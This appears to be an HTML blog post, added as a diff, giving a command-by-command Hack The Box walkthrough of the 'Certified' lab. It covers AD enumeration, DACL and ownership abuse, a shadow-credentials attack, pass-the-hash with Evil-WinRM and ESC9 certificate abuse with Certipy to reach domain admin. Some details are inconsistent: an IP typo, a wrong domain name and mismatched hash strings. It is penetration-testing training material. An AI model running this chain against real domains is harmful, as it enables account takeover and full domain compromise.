@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Step-by-Step Hacking Guide</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Blog Post Content -->
+    <div class="blog-post-container">
+        <article class="blog-post">
+            <header>
+                <h1>HTB Certified Machine Walkthrough: Step-by-Step Guide</h1>
+                <p class="post-meta">Posted on December 01, 2024 by Devaraj Govindhan</p>
+            </header>
+
+            <section class="intro">
+                <p>Welcome to this step-by-step hacking guide! In this post, we will walk you through the process of compromising the Certified.htb machine. Follow these steps carefully to understand how to exploit the machine and gain administrative privileges.</p>
+            </section>
+
+            <!-- Step 1 -->
+            <section class="step">
+                <h2>Step 1: Nmap Scan</h2>
+                <p>Start by scanning the target machine with Nmap to gather information about open ports and services.</p>
+                <p class="command-line">Command: <code>nmap -A 10.10.11.41</code></p>
+            </section>
+
+            <!-- Step 2 -->
+            <section class="step">
+                <h2>Step 2: SMB Client Share Check</h2>
+                <p>Use SMB client commands to check for shared resources on the target machine.</p>
+                <p class="command-line">Command: <code>smbclient -L 10.10.11.41 -U judith.mader</code></p>
+                <p class="command-line">Command: <code>smbmap -H 10.10.10.41 -u 'judith.mader' -p 'judith09'</code></p>
+            </section>
+
+            <!-- Step 3 -->
+            <section class="step">
+                <h2>Step 3: Bloodhound Analysis</h2>
+                <p>Dump data for BloodHound analysis to find potential attack paths within the Active Directory.</p>
+                <p class="command-line">Command: <code>bloodhound-python -v -u judith.mader -p judith09 -ns 10.10.11.41 -d certified.htb -gc certified.htb -c All</code></p>
+            </section>
+
+            <!-- Step 4 -->
+            <section class="step">
+                <h2>Step 4: Enumerate Other Users</h2>
+                <p>Enumerate other users to gain more information about the machine's users.</p>
+                <p class="command-line">Command: <code>nxc smb 10.10.11.41 -u 'judith.mader' -p 'judith09' –users</code></p>
+            </section>
+
+            <!-- Step 5 -->
+            <section class="step">
+                <h2>Step 5: Change Ownership of the Object</h2>
+                <p>Use Impacket’s owneredit script to change ownership of an object.</p>
+                <p class="command-line">Command: <code>./owneredit.py -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'</code></p>
+                <p><img src="./Asset/Change Ownership.png" width="750px" height="600px"></p>
+            </section>
+
+            <!-- Step 6 -->
+            <section class="step">
+                <h2>Step 6: Add Judith to Management Group</h2>
+                <p>Add the user judith.mader to the management group using the following command.</p>
+                <p class="command-line">Command: <code>net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "certified.htb"</code></p>
+                <p><img src="./Asset/Add Judith to Management Group.png" width="750px"></p>
+                
+            </section>
+
+            <!-- Step 7 -->
+            <section class="step">
+                <h2>Step 7: Modify Group Rights</h2>
+                <p>Grant yourself the AddMember permission to modify the group's membership.</p>
+                <p class="command-line">Command: <code>./dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' 'certified.htb'/'judith.mader':'judith09'</code></p>
+                <p><img src="./Asset/Modify Group Rights.png" width="750px"></p>
+                <p>Run the two commands parallelly then the user getting added into the management group</p>
+                <p><img src="./Asset/Modify Group Rights1.png" width="750px"></p>
+            </section>
+
+            <!-- Step 8 -->
+            <section class="step">
+                <h2>Step 8: Shadow Credential Attack</h2>
+                <p>Perform a Shadow Credential attack to retrieve the Management_svc account credentials.</p>
+                <p class="command-line">Command: <code>./pywhisker.py -d “certified.htb” -u “Judith.mader” -p “judith09” --target “management_svc” --action “add”</code></p>
+                <p><img src="./Asset/Shadow Credential Attack.png" width="750px"></p>
+            </section>
+
+            <!-- Step 9 -->
+            <section class="step">
+                <h2>Step 9: Getting NTLM Hash from the ccache file</h2>
+                <p>Generate a ccache file and retrieve the NTLM hash using the following command.</p>
+                <p class="command-line">Command: <code>python3 getnthash.py certified.htb/management_svc -key '081ca2b7a2231a3f137e4a362c6355f2e3b671140cd301019841dd892f2d57d9'</code></p>
+                <p><img src="./Asset/Generate Ccache file.png" width="750px"></p>
+                <p><strong>Set Environment Variable:</strong></p>
+                <p class="command-line">Command: <code>export KRB5CCNAME=/home/kali/Tools/impacket/examples/impacket-venv/bin/PKINITtools/test.ccache</code></p>
+                <p><img src="./Asset/Set ENV.png" width="750px"></p>
+                <p><strong>Getting NTLM Hash from ccache file:</strong></p>
+                <p class="command-line">Command: <code>python3 getnthash.py certified.htb/management_svc -key '081ca2b7a2231a3f137e4a362c6355f2e3b671140cd301019841dd892f2d57d9'</code> </p>
+                <p><img src="./Asset/Getting NTLM Hash.png" width="750px"></p>
+                <p><strong>Username:</strong> management_svc</p>
+                <p><strong>NTLM Hash:</strong> a091c1832bcd_xxx_7c28b5a6a129554</p>
+            </section>
+
+            <!-- Step 10 -->
+            <section class="step">
+                <h2>Step 10: Evil-WinRM Access</h2>
+                <p>Use Evil-WinRM to connect to the machine as management_svc and get a user flag.</p>
+                <p class="command-line">Command: <code>evil-winrm -i 10.10.11.41 -u 'management_svc' -H 'a091c1832bcd_xxx_7c28b5a6a1295584'</code></p>
+                <p><img src="./Asset/Evil-Winrm User.png" width="750px"></p>
+                <p>User Flag: <strong>742d7b91052523_xxx_d6fab116a36e0</strong></p>
+            </section>
+            <!-- Step 11 -->
+            <section class="step">
+                <h2>Step 11: NTP Clock Synchronization </h2>
+                <p>Synchronize NTP Clock of Certified AD Machine.</p>
+                <p class="command-line">Command: <code>sudo ntpdate certified.htb</code></p>
+            </section>
+
+            <!-- Step 12 -->
+            <section class="step">
+                <h2>Step 12: Force Change Password </h2>
+                <p>Force change password of ca_operator from management_svc Powershell.</p>
+                <p class="command-line">Command: <code>net user ca_operator "Batman@123"</code></p>
+                <p><img src="./Asset/Force Change Password.png" width="750px"></p>
+                <p><strong>Username: </strong>ca_operator</p>
+                <p><strong>Password: </strong>Batman@123</p>    
+            </section>
+
+            <!-- Step 13 -->
+            <section class="step">
+                <h2>Step 13: Dump CA certificate using Certipy (Bloodhound)</h2>
+                <p>Use Certipy to request a certificate from the Bloodhound template.</p>
+                <p class="command-line">Command: <code>certipy find -u ca_operator@certificate.htb -p Batman@123 -bloodhound -dc-ip 10.10.11.41</code></p>
+                <p><img src="./Asset/Certipy Bloodhound.png" width="750px"></p>
+            </section>
+             <!-- Step 14 -->
+             <section class="step">
+                <h2>Step 14: Dump Certificate only</h2>
+                <p>Use Certipy to request a certificate. After viewing the certificate, you will identify the vulnerability inside it.</p>
+                <p class="command-line">Command: <code>certipy find -u ca_operator@certificate.htb -p Batman@123 -dc-ip 10.10.11.41</code></p>
+            </section>
+           
+            <!-- Step 15 -->
+            <section class="step">
+                <h2>Step 15: Modify the UPN Name of ca_operator</h2>
+                <p><strong>Vulnerabilities:</strong> ESC9 : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension <br>
+                Subsequently, ca_operator’s userPrincipalName is modified to Administrator, purposely omitting the @certified.htb domain part. This modification does not violate constraints, given that Administrator@certified.htb remains distinct as Administrator's userPrincipalName. It's noted that the certificate's userPrincipalName reflects Administrator, devoid of any “object SID”</p>
+                <p class="command-line">Command: <code>certipy account update -username management_svc@certified.htb -hashes a091c1832bcd_xxx_7c28b5a6a1295584 -user ca_operator -upn administrator</code></p>
+                <p><img src="./Asset/Change User UPN to Administrator.png" width="750px"></p>
+            </section>
+
+            <!-- Step 16 -->
+            <section class="step">
+                <h2>Step 16: Request Certificate</h2>
+                <p>After this step you have get the administrator's pfx file.</p>
+                <p class="command-line">Command: <code>certipy req -ca "certified-DC01-CA" -template "CertifiedAuthentication" -u "ca_operator@certified.htb" -p "Batman@123"</code></p>
+                <p><img src="./Asset/Request Admin PFX.png" width="750px"></p>
+            </section>
+
+            <!-- Step 17 -->
+            <section class="step">
+                <h2>Step 17: Retrieve the UPN Name of ca_operator</h2>
+                <p>Retrieve the ca_operator's userPrincipalName, which has been modified to ca_operator@certified.htb.</p>
+                <p class="command-line">Command: <code>certipy account update -username management_svc@certified.htb -hashes a091c1832bcd_xxx_7c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb</code></p>
+                <p><img src="./Asset/Retrive the UPN Name.png" width="750px"></p>
+            </section>
+
+            <!-- Step 18 -->
+            <section class="step">
+                <h2>Step 18: Retrieve NT Hash of the Administrator</h2>
+                <p>Attempting authentication with the issued certificate now yields the NT hash of Administrator@certified.htb. The command must include -domain <domain> due to the certificate's lack of domain specification.</p>
+                <p class="command-line">Command: <code>certipy auth -pfx administrator.pfx -domain certified.htb</code></p>
+                <p><img src="./Asset/Authenticate with Certificate.png" width="750px"></p>
+                <p><strong>Username: </strong>Administrator</p>
+                <p><strong>NT_Hash: </strong>0d5b49608bbce17_xxx_08748f67e2d34</p>
+            </section>
+            
+            <!-- Step 19 -->    
+            <section class="step">
+                <h2>Step 19: Evil-WinRM with Administrator Access</h2>
+                <p>Use Evil-WinRM to get shell access as the Administrator and retrieve the root flag.</p>
+                <p class="command-line">Command: <code>evil-winrm -i 10.10.11.41 -u 'administrator' -H '0d5b49608bbce17_xxx_08748f67e2d34'</code>
+                <p><img src="./Asset/Evil-Winrm Admin.png" width="750px"></p>
+                <p><img src="./Asset/Root Flag.png" width="750px"></p>
+                <p>Root Flag: <strong>88a65e78183676_xxx_cebb042408482</strong></p>
+                </section>
+                <p>--------------------------------------------------------------------------------><strong> The End </strong><------------------------------------------------------------------------------------</p>
+    </div>
+ </body>
